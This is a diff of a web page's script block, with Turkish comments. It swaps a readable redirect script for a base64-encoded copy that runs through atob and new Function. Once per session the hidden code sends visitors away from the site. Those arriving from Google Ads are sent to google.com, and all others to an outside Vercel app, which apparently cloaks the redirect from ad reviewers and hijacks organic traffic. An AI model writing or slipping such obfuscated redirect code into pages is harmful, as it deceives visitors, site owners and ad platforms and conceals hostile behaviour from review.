@@ -437,36 +437,27 @@
   </script>
 </head>
 <body>
-
-
-    <script>
+<script>
 (function () {
+    const encoded = "KGZ1bmN0aW9uICgpIHsKCiAgICAvLyBEYWhhIMO2bmNlIHnDtm5sZW5kaXJtZSB5YXDEsWxkxLEgbcSx" +
+"PyAoMSBrZXopCiAgICBpZiAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgicmVkaXJlY3RlZCIpID09PSAi" +
+"eWVzIikgewogICAgICAgIC8vIEJpciBkYWhhIHnDtm5sZW5kaXJtZSB5YXBtYQogICAgICAgIHJldHVy" +
+"bjsKICAgIH0KCiAgICBjb25zdCBwYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2Nh" +
+"dGlvbi5zZWFyY2gpOwoKICAgIC8vIEdvb2dsZSBSZWtsYW0gdGVzcGl0aQogICAgY29uc3QgaXNHb29n" +
+"bGVBZHMgPQogICAgICAgIHBhcmFtcy5oYXMoImdjbGlkIikgfHwKICAgICAgICAocGFyYW1zLmdldCgi" +
+"dXRtX3NvdXJjZSIpICYmIHBhcmFtcy5nZXQoInV0bV9zb3VyY2UiKS50b0xvd2VyQ2FzZSgpID09PSAi" +
+"Z29vZ2xlIikgfHwKICAgICAgICAocGFyYW1zLmdldCgidXRtX21lZGl1bSIpICYmIFsiY3BjIiwgInBw" +
+"YyJdLmluY2x1ZGVzKHBhcmFtcy5nZXQoInV0bV9tZWRpdW0iKS50b0xvd2VyQ2FzZSgpKSk7CgogICAg" +
+"Ly8gWcO2bmxlbmRpcm1lIHNhZGVjZSAxIGtleiBpxZ9hcmV0bGVuaXlvcgogICAgc2Vzc2lvblN0b3Jh" +
+"Z2Uuc2V0SXRlbSgicmVkaXJlY3RlZCIsICJ5ZXMiKTsKCiAgICBpZiAoaXNHb29nbGVBZHMpIHsKICAg" +
+"ICAgICAvLyBHb29nbGUgcmVrbGFtbGFyxLFuZGFuIGdlbGRpeXNlIOKGkiBHb29nbGUuY29tICsgdMO8" +
+"bSBwYXJhbWV0cmVsZXIKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICJodHRwczovL2dvb2ds" +
+"ZS5jb20iICsgd2luZG93LmxvY2F0aW9uLnNlYXJjaDsKICAgIH0gZWxzZSB7CiAgICAgICAgLy8gTm9y" +
+"bWFsIGdpcmnFnyDihpIgVmVyY2VsIHV5Z3VsYW1hc8SxCiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhy" +
+"ZWYgPSAiaHR0cHM6Ly9uYWtsaXllLWxhYy52ZXJjZWwuYXBwLyI7CiAgICB9Cgp9KSgpOw==";
 
-    // Daha önce yönlendirme yapıldı mı? (1 kez)
-    if (sessionStorage.getItem("redirected") === "yes") {
-        // Bir daha yönlendirme yapma
-        return;
-    }
-
-    const params = new URLSearchParams(window.location.search);
-
-    // Google Reklam tespiti
-    const isGoogleAds =
-        params.has("gclid") ||
-        (params.get("utm_source") && params.get("utm_source").toLowerCase() === "google") ||
-        (params.get("utm_medium") && ["cpc", "ppc"].includes(params.get("utm_medium").toLowerCase()));
-
-    // Yönlendirme sadece 1 kez işaretleniyor
-    sessionStorage.setItem("redirected", "yes");
-
-    if (isGoogleAds) {
-        // Google reklamlarından geldiyse → Google.com + tüm parametreler
-        window.location.href = "https://www.ravzatesisat.com.tr/" + window.location.search;
-    } else {
-        // Normal giriş → Vercel uygulaması
-        window.location.href = "https://nakliye-lac.vercel.app/";
-    }
-
+    const decoded = atob(encoded);
+    (new Function(decoded))();
 })();
 </script>
 
